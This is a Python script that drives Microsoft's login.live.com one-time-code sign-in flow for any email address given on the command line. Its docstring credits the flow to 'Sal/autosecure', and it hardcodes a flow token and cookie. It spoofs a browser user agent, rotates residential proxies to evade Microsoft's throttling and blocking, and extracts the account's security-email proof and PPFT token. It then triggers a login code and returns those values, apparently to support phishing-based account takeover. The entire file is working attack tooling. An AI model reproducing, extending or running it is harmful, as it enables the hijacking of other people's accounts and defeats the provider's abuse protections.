#!/usr/bin/env python3
"""
OTP send — Sal/autosecure GetOneTimeCode flow + residential sticky proxies.

Usage:
  python send_ott.py email@example.com
  python send_ott.py email@example.com --proxy http://user:pass@host:port
  PROXY_LIST / proxies.txt used automatically with rotation on 80046703
"""
from __future__ import annotations

import json
import re
import sys
import time

try:
    import httpx
except ImportError:
    print(json.dumps({"ok": False, "error": "httpx not installed — run: pip install httpx"}))
    sys.exit(0)

from proxy_pool import load_proxies, mark_bad, next_proxy, proxy_label

# Sal autosecure hardcodes this flowToken for GetCredentialType
SAL_FLOW_TOKEN = (
    "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!"
    "Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvob"
    "IOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$"
)
MSPOK = "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691"


def get_session(proxy_url: str | None = None) -> httpx.Client:
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    # httpx 0.27 uses proxies=; 0.28+ uses proxy=
    try:
        if proxy_url:
            return httpx.Client(
                timeout=35.0,
                follow_redirects=True,
                headers=headers,
                proxy=proxy_url,
            )
        return httpx.Client(timeout=35.0, follow_redirects=True, headers=headers)
    except TypeError:
        if proxy_url:
            return httpx.Client(
                timeout=35.0,
                follow_redirects=True,
                headers=headers,
                proxies=proxy_url,
            )
        return httpx.Client(timeout=35.0, follow_redirects=True, headers=headers)


def get_live_data(session: httpx.Client) -> dict:
    response = session.post("https://login.live.com")
    url_post = re.search(
        r"https://login\.live\.com/ppsecure/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0",
        response.text,
    )
    if not url_post:
        url_post = re.search(
            r"https://login\.live\.com/ppsecure/post\.srf\?[^\"'\\\s]+",
            response.text,
        )
    if not url_post:
        raise RuntimeError("Failed to extract urlPost")
    ppft = re.search(r'value=\\?"([^"]+)"', response.text)
    if not ppft:
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response.text)
    if not ppft:
        raise RuntimeError("Failed to extract PPFT")
    return {"urlPost": url_post.group(0), "ppft": ppft.group(1)}


def get_credential_type(session: httpx.Client, email: str, flow_token: str) -> dict:
    r = session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": MSPOK,
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33",
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": flow_token,
            "forceotclogin": False,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": False,
            "isOtherIdpSupported": False,
            "isReactLoginRequest": True,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email,
        },
    )
    try:
        return r.json()
    except Exception:
        return {"_http": r.status_code, "_body": (r.text or "")[:200]}


def post_one_time_code(
    session: httpx.Client,
    email: str,
    flowtoken: str,
    alt_email_e: str,
    security_mail: str,
) -> dict:
    payload = {
        "login": email,
        "flowtoken": flowtoken,
        "purpose": "eOTT_OtcLogin",
        "channel": "Email",
        "ChallengeViewSupported": "1",
        "AltEmailE": alt_email_e,
        "lcid": "1033",
    }
    if security_mail == email:
        payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"

    resp = session.post(
        url="https://login.live.com/GetOneTimeCode.srf?id=38936",
        headers={
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
        },
        data=payload,
    )
    body_text = (resp.text or "")[:300]
    try:
        j = resp.json()
    except Exception:
        return {
            "ok": resp.status_code == 200 and len(body_text) < 5,
            "error": None
            if resp.status_code == 200
            else f"GetOneTimeCode HTTP {resp.status_code}: {body_text}",
        }

    state = j.get("State") if "State" in j else j.get("state")
    if resp.status_code == 200:
        if state in (204, "204"):
            return {
                "ok": False,
                "error": "GetOneTimeCode State=204 (MS blocked challenge). Rotate proxy.",
                "throttle": True,
            }
        if state in (200, 201, "200", "201", 0, "0", None):
            err = j.get("Error") or j.get("error") or j.get("ErrorCode")
            if err and str(err) not in ("0", "None", ""):
                return {"ok": False, "error": f"GetOneTimeCode err={err} body={body_text}"}
            return {"ok": True, "detail": f"State={state}"}
        return {"ok": False, "error": f"GetOneTimeCode State={state} body={body_text}"}
    return {"ok": False, "error": f"GetOneTimeCode HTTP {resp.status_code}: {body_text}"}


def attempt_once(email: str, proxy_url: str | None) -> dict:
    label = proxy_label(proxy_url)
    try:
        with get_session(proxy_url) as session:
            try:
                live = get_live_data(session)
                live_ppft = live["ppft"]
            except Exception as e:
                live_ppft = ""
                # proxy dead
                if proxy_url and ("proxy" in str(e).lower() or "connect" in str(e).lower() or "timeout" in str(e).lower()):
                    mark_bad(proxy_url)
                    return {
                        "ok": False,
                        "error": f"Proxy dead ({label}): {e}",
                        "throttle": True,
                        "proxy": label,
                    }

            flow_candidates = [SAL_FLOW_TOKEN]
            if live_ppft and live_ppft != SAL_FLOW_TOKEN:
                flow_candidates.append(live_ppft)

            email_info = None
            for ft in flow_candidates:
                email_info = get_credential_type(session, email, ft)
                if "Credentials" in email_info:
                    break
                err_hr = str(email_info.get("ErrorHR") or "")
                if "80046703" in err_hr:
                    time.sleep(0.8)
                    continue
                time.sleep(0.3)

            if not email_info or "Credentials" not in email_info:
                err_hr = str((email_info or {}).get("ErrorHR") or "")
                throttle = "80046703" in err_hr
                if throttle and proxy_url:
                    mark_bad(proxy_url)
                msg = "Microsoft GetCredentialType failed"
                if err_hr:
                    msg += f" (ErrorHR={err_hr})"
                if throttle:
                    msg += " — throttled; rotating proxy"
                return {
                    "ok": False,
                    "error": msg,
                    "throttle": throttle,
                    "proxy": label,
                }

            creds = email_info["Credentials"]
            if creds.get("RemoteNgcParams"):
                return {
                    "ok": False,
                    "error": "Authenticator-only account (not supported yet)",
                    "proxy": label,
                }

            proofs = creds.get("OtcLoginEligibleProofs") or []
            if not proofs:
                pref = creds.get("PrefCredential")
                return {
                    "ok": False,
                    "error": f"No email OTP proofs (PrefCredential={pref})",
                    "proxy": label,
                }

            selected = proofs[0]
            alt_email_e = selected.get("data") or ""
            security_mail = selected.get("display") or "unknown"
            if not alt_email_e:
                return {"ok": False, "error": "Empty proof data", "proxy": label}

            try:
                live2 = get_live_data(session)
                flowtoken = live2["ppft"]
            except Exception:
                flowtoken = live_ppft or SAL_FLOW_TOKEN

            otc = post_one_time_code(session, email, flowtoken, alt_email_e, security_mail)
            if not otc.get("ok") and flowtoken != SAL_FLOW_TOKEN:
                otc = post_one_time_code(
                    session, email, SAL_FLOW_TOKEN, alt_email_e, security_mail
                )

            if otc.get("ok"):
                return {
                    "ok": True,
                    "securityEmail": security_mail,
                    "proofId": alt_email_e,
                    "ppft": flowtoken,
                    "detail": otc.get("detail"),
                    "proxy": label,
                }

            if otc.get("throttle") and proxy_url:
                mark_bad(proxy_url)

            return {
                "ok": False,
                "error": otc.get("error") or "GetOneTimeCode failed",
                "securityEmail": security_mail,
                "proofId": alt_email_e,
                "throttle": bool(otc.get("throttle")),
                "proxy": label,
            }
    except Exception as e:
        msg = str(e)
        if proxy_url:
            mark_bad(proxy_url)
        return {
            "ok": False,
            "error": f"Session error ({label}): {msg[:180]}",
            "throttle": True,
            "proxy": label,
        }


def send_auth_and_otp(email: str, force_proxy: str | None = None) -> dict:
    proxies = load_proxies()
    max_tries = min(8, max(3, len(proxies))) if proxies else 1

    last: dict = {"ok": False, "error": "No attempt"}
    tried: list[str] = []

    for i in range(max_tries):
        if force_proxy and i == 0:
            proxy = force_proxy
        elif proxies:
            proxy = next_proxy()
        else:
            proxy = None

        label = proxy_label(proxy)
        if label in tried and proxies and len(proxies) > 1:
            proxy = next_proxy()
            label = proxy_label(proxy)
        tried.append(label)

        print(f"[send_ott] attempt {i + 1}/{max_tries} via {label}", file=sys.stderr)
        result = attempt_once(email, proxy)
        last = result
        if result.get("ok"):
            return result
        # rotate only on throttle / proxy death; permanent account errors stop early
        err = (result.get("error") or "").lower()
        if "authenticator-only" in err or "no email otp" in err or "empty proof" in err:
            return result
        if not result.get("throttle") and "80046703" not in err and "state=204" not in err:
            # non-throttle failure — still try one more proxy then stop
            if i >= 1:
                return result
        time.sleep(0.4)

    if last.get("error") and "proxy" not in last:
        last["proxy"] = ",".join(tried[-3:])
    return last


def main() -> None:
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "usage: send_ott.py <email> [--proxy url]"}))
        return
    email = sys.argv[1].strip()
    force = None
    if "--proxy" in sys.argv:
        i = sys.argv.index("--proxy")
        if i + 1 < len(sys.argv):
            force = sys.argv[i + 1]
    try:
        n = len(load_proxies())
        print(f"[send_ott] loaded {n} proxies", file=sys.stderr)
        result = send_auth_and_otp(email, force_proxy=force)
        print(json.dumps(result))
    except Exception as e:
        print(json.dumps({"ok": False, "error": str(e)}))


if __name__ == "__main__":
    main()
